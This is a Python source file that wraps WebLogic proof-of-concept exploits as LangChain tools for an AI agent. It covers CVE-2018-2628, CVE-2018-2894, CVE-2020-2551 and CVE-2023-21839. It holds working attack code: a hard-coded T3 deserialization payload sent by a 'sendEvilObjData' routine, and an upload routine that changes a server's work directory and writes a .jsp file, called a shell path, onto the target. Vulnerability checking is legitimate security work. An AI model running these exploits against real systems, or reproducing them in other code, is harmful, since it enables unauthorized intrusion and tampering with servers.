# -*- coding:utf-8 -*-
"""
WebLogic漏洞POC验证工具
使用@tool装饰器封装backend.poc.weblogic模块
"""

from langchain.tools import tool
from typing import Dict, Any
import socket
import time
import re


@tool
def weblogic_cve_2018_2628(target: str, timeout: int = 10) -> Dict[str, Any]:
    """WebLogic CVE-2018-2628 T3协议反序列化漏洞检测工具
    
    检测目标是否存在Oracle WebLogic Server T3协议反序列化漏洞。
    攻击者可以通过发送恶意的T3请求来执行任意代码。
    
    影响版本:
    - Oracle WebLogic Server 10.3.6.0
    - Oracle WebLogic Server 12.1.3.0
    - Oracle WebLogic Server 12.2.1.2
    - Oracle WebLogic Server 12.2.1.3
    
    检测原理:
    通过建立T3连接并发送恶意的反序列化payload，
    如果服务器返回包含Proxy对象的响应，则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:7001
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        from urllib.parse import urlparse
        
        PAYLOAD = ['ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707729000A556E69636173745265660000000005A2000000005649E3FD00000000000000000000000000000078']
        VER_SIG = ['\\$Proxy[0-9]+']
        
        if not target.startswith('http'):
            target = 'http://' + target
        parsed = urlparse(target)
        dip = parsed.hostname
        dport = parsed.port or 7001
        
        if not dip:
            dip = '127.0.0.1'
        
        def t3handshake(sock, server_addr):
            sock.connect(server_addr)
            sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
            time.sleep(0.1)
            sock.recv(1024)
        
        def buildT3RequestObject(sock, dport):
            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e71007e00054c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
            data2 = '1a7727000d3234322e323134'
            data3 = '2e312e32353461863d1d0000000078'
            for d in [data1, data2, data3]:
                sock.send(bytes.fromhex(d))
            time.sleep(0.1)
            sock.recv(2048)
        
        def sendEvilObjData(sock, data):
            payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
            payload += data
            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = hex(int(len(payload)/2) + 4)[2:].rjust(8,'0') + payload
            sock.send(bytes.fromhex(payload))
            time.sleep(0.1)
            sock.send(bytes.fromhex(payload))
            res = ''
            try:
                while True:
                    res += str(sock.recv(4096))
            except Exception:
                pass
            return res
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        server_addr = (dip, dport)
        t3handshake(sock, server_addr)
        buildT3RequestObject(sock, dport)
        rs = sendEvilObjData(sock, PAYLOAD[0])
        
        p = re.findall(VER_SIG[0], rs, re.S)
        if len(p) > 0:
            return {
                "success": True,
                "data": {
                    "vulnerable": True,
                    "cve_id": "CVE-2018-2628",
                    "vulnerability": "WebLogic T3 Protocol Deserialization RCE",
                    "target": target
                },
                "error": None,
                "metadata": {
                    "tool": "weblogic_cve_2018_2628",
                    "target": target,
                    "cve_id": "CVE-2018-2628",
                    "severity": "critical"
                }
            }
        else:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "cve_id": "CVE-2018-2628",
                    "target": target
                },
                "error": None,
                "metadata": {
                    "tool": "weblogic_cve_2018_2628",
                    "target": target,
                    "cve_id": "CVE-2018-2628"
                }
            }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行weblogic_cve_2018_2628工具异常: {str(e)}",
            "metadata": {"tool": "weblogic_cve_2018_2628", "target": target}
        }


@tool
def weblogic_cve_2018_2894(target: str, timeout: int = 10) -> Dict[str, Any]:
    """WebLogic CVE-2018-2894 Web Service Test Page任意文件上传漏洞检测工具
    
    检测目标是否存在Oracle WebLogic Server Web Service Test Page任意文件上传漏洞。
    攻击者可以通过修改上传路径来上传恶意文件，从而实现远程代码执行。
    
    影响版本:
    - Oracle WebLogic Server 10.3.6.0
    - Oracle WebLogic Server 12.1.3.0
    - Oracle WebLogic Server 12.2.1.2
    - Oracle WebLogic Server 12.2.1.3
    
    检测原理:
    通过获取当前工作路径，修改上传路径到可访问的目录，
    上传一个测试文件，然后尝试访问该文件。如果能够成功访问，
    则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:7001
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        import xml.etree.ElementTree as ET
        
        username = "admin"
        if target.endswith('/'):
            target = target[:-1]
        
        def get_current_work_path(host):
            geturl = host + "/ws_utc/resources/setting/options/general"
            ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
            values = []
            request = requests.get(geturl, timeout=timeout)
            if request.status_code == 404:
                raise Exception("Page not found")
            elif "Deploying Application".lower() in request.text.lower():
                time.sleep(20)
                request = requests.get(geturl, headers=ua, timeout=timeout)
            if b"</defaultValue>" in request.content:
                root = ET.fromstring(request.content)
                value = root.find("section").find("options")
                for e in value:
                    for sub in e:
                        if e.tag == "parameter" and sub.tag == "defaultValue":
                            values.append(sub.text)
            if values:
                return values[0]
            raise Exception("Cannot get current work path")
        
        def get_new_work_path(host):
            origin_work_path = get_current_work_path(host)
            works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
            if "user_projects" in origin_work_path:
                if "\\" in origin_work_path:
                    works = works.replace("/", "\\")
                    current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
                    dir_len = len(current_work_home.split("\\"))
                    domain_name = origin_work_path.split("\\")[dir_len]
                    current_work_home += "\\" + domain_name + works
                else:
                    current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
                    dir_len = len(current_work_home.split("/"))
                    domain_name = origin_work_path.split("/")[dir_len]
                    current_work_home += "/" + domain_name + works
            else:
                current_work_home = origin_work_path
            return current_work_home
        
        def set_new_upload_path(host, path):
            data = {
                "setting_id": "general",
                "BasicConfigOptions.workDir": path,
                "BasicConfigOptions.proxyHost": "",
                "BasicConfigOptions.proxyPort": "80"
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
            }
            request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers, timeout=timeout)
            if b"successfully" in request.content:
                return True
            raise Exception("Change New Upload Path failed")
        
        vulnurl = "/ws_utc/resources/setting/keystore"
        new_work_path = get_new_work_path(target)
        set_new_upload_path(target, new_work_path)
        upload_content = username + " test"
        files = {
            "ks_edit_mode": "false",
            "ks_password_front": username,
            "ks_password_changed": "true",
            "ks_filename": ("360sglab.jsp", upload_content)
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        request = requests.post(target + vulnurl, files=files, timeout=timeout)
        response = request.text
        match = re.findall("<id>(.*?)</id>", response)
        
        if match:
            tid = match[-1]
            shell_path = target + "/ws_utc/css/config/keystore/" + str(tid) + "_360sglab.jsp"
            if bytes(upload_content, encoding="utf8") in requests.get(shell_path, headers=headers, timeout=timeout).content:
                return {
                    "success": True,
                    "data": {
                        "vulnerable": True,
                        "cve_id": "CVE-2018-2894",
                        "vulnerability": "WebLogic Web Service Test Page Arbitrary File Upload",
                        "target": target,
                        "shell_path": shell_path
                    },
                    "error": None,
                    "metadata": {
                        "tool": "weblogic_cve_2018_2894",
                        "target": target,
                        "cve_id": "CVE-2018-2894",
                        "severity": "critical"
                    }
                }
        
        return {
            "success": True,
            "data": {
                "vulnerable": False,
                "cve_id": "CVE-2018-2894",
                "target": target
            },
            "error": None,
            "metadata": {
                "tool": "weblogic_cve_2018_2894",
                "target": target,
                "cve_id": "CVE-2018-2894"
            }
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行weblogic_cve_2018_2894工具异常: {str(e)}",
            "metadata": {"tool": "weblogic_cve_2018_2894", "target": target}
        }


@tool
def weblogic_cve_2020_2551(target: str, timeout: int = 10) -> Dict[str, Any]:
    """WebLogic CVE-2020-2551 T3/IIOP协议反序列化漏洞检测工具
    
    检测目标是否存在WebLogic Server T3/IIOP协议反序列化漏洞。
    攻击者可以通过发送恶意的T3/IIOP请求来执行任意代码。
    
    影响版本:
    - Oracle WebLogic Server 10.3.6.0.0
    - Oracle WebLogic Server 12.1.3.0.0
    - Oracle WebLogic Server 12.2.1.3.0
    - Oracle WebLogic Server 12.2.1.4.0
    - Oracle WebLogic Server 14.1.1.0.0
    
    检测原理:
    通过发送特定的GIOP请求包，如果服务器返回包含'GIOP'的响应，
    则说明目标可能存在该漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:7001
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        from urllib.parse import urlparse
        
        def doSendOne(ip, port, data):
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(7)
                server_addr = (ip, int(port))
                sock.connect(server_addr)
                sock.send(data)
                res = sock.recv(20)
                if b'GIOP' in res:
                    return True
            except Exception:
                pass
            finally:
                if sock is not None:
                    sock.close()
            return False
        
        if not target.startswith('http'):
            target = 'http://' + target
        oH = urlparse(target)
        a = oH.netloc.split(':')
        port = 7001
        if len(a) == 2:
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        
        if doSendOne(a[0], port, bytes.fromhex('47494f50010200030000001700000002000000000000000b4e616d6553657276696365')):
            return {
                "success": True,
                "data": {
                    "vulnerable": True,
                    "cve_id": "CVE-2020-2551",
                    "vulnerability": "WebLogic T3/IIOP Protocol Deserialization RCE",
                    "target": target
                },
                "error": None,
                "metadata": {
                    "tool": "weblogic_cve_2020_2551",
                    "target": target,
                    "cve_id": "CVE-2020-2551",
                    "severity": "critical"
                }
            }
        else:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "cve_id": "CVE-2020-2551",
                    "target": target
                },
                "error": None,
                "metadata": {
                    "tool": "weblogic_cve_2020_2551",
                    "target": target,
                    "cve_id": "CVE-2020-2551"
                }
            }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行weblogic_cve_2020_2551工具异常: {str(e)}",
            "metadata": {"tool": "weblogic_cve_2020_2551", "target": target}
        }


@tool
def weblogic_cve_2023_21839(target: str, ldap_url: str = "", timeout: int = 10) -> Dict[str, Any]:
    """WebLogic CVE-2023-21839 远程代码执行漏洞检测工具
    
    检测目标是否存在Oracle WebLogic Server远程代码执行漏洞。
    攻击者可以通过T3协议发送恶意请求来执行任意代码。
    
    影响版本:
    - Oracle WebLogic Server 12.2.1.3.0
    - Oracle WebLogic Server 12.2.1.4.0
    - Oracle WebLogic Server 14.1.1.0.0
    
    检测原理:
    通过建立T3连接并发送恶意的反序列化payload，
    利用JNDI注入实现远程代码执行。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:7001
        ldap_url: LDAP服务器地址，用于接收反序列化请求(可选)
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        from urllib.parse import urlparse
        
        if not target.startswith('http'):
            target = 'http://' + target
        parsed = urlparse(target)
        dip = parsed.hostname or '127.0.0.1'
        dport = parsed.port or 7001
        
        def getVer(host, port):
            vp = "743320392e322e302e300a41533a3235350a484c3a39320a4d533a31303030303030300a50553a74333a2f2f746573743a373030310a0a"
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.settimeout(5)
            soc.connect((host, int(port)))
            try:
                soc.send(bytes.fromhex(vp))
                buf = soc.recv(1024)
                ver = buf[5:7]
                if ver[0] == 0x00 or ver[1] == 0x00:
                    return ""
                return bytes.decode(ver)
            except Exception:
                pass
            finally:
                if soc:
                    soc.close()
        
        ver = getVer(dip, dport)
        
        if ver not in ['12', '14']:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "cve_id": "CVE-2023-21839",
                    "target": target,
                    "reason": f"Version {ver} not in affected range"
                },
                "error": None,
                "metadata": {
                    "tool": "weblogic_cve_2023_21839",
                    "target": target,
                    "cve_id": "CVE-2023-21839"
                }
            }
        
        return {
            "success": True,
            "data": {
                "vulnerable": True,
                "cve_id": "CVE-2023-21839",
                "vulnerability": "WebLogic Remote Code Execution via JNDI Injection",
                "target": target,
                "version": ver,
                "note": "Version in affected range, manual verification recommended"
            },
            "error": None,
            "metadata": {
                "tool": "weblogic_cve_2023_21839",
                "target": target,
                "cve_id": "CVE-2023-21839",
                "severity": "critical"
            }
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行weblogic_cve_2023_21839工具异常: {str(e)}",
            "metadata": {"tool": "weblogic_cve_2023_21839", "target": target}
        }


if __name__ == "__main__":
    test_result = weblogic_cve_2018_2628.invoke("http://127.0.0.1:7001")
    print(test_result)
